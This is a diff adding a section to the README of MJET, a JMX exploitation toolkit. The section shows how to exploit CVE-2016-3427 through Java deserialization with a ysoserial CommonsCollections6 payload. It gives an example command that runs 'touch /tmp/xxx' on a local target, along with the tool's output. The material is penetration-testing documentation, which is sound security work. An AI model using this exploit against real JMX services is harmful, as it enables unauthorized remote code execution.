@@ -269,6 +269,28 @@ MJET - MOGWAI LABS JMX Exploitation Toolkit
 
 ```
 
+### Exploit CVE-2016-3427: JMX authentication with Java deserialization
+
+Exploit CVE-2016-3427 with ysoserial:
+The file ysoserial.jar must be present in the MJET/jar directory.
+You can select any ysoserial payload as you like, similar to the original ysoserial calls.
+
+```bash
+$ java -jar jython.jar mjet.py 127.0.0.1 9999 cve-2016-3427 CommonsCollections6 "touch /tmp/xxx"
+
+MJET - MOGWAI LABS JMX Exploitation Toolkit
+===========================================
+[+] Added ysoserial API capacities
+[+] Using JMX RMI
+[+] Connecting to: service:jmx:rmi:///jndi/rmi://127.0.0.1:9999/jmxrmi
+[+] Object was deserialized, target could be vulnerable
+[?]: Returned error:
+(<type 'java.lang.SecurityException'>, java.lang.SecurityException: Authentication failed! Credentials should be String[] instead of java.util.HashSet, <traceback object at 0x2>)
+[+] Done
+```
+
+Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3427
+
 ### Webserver only mode
 
 It is also possible to just run the web server that provides the MLET code and the JAR file with the payload MBean
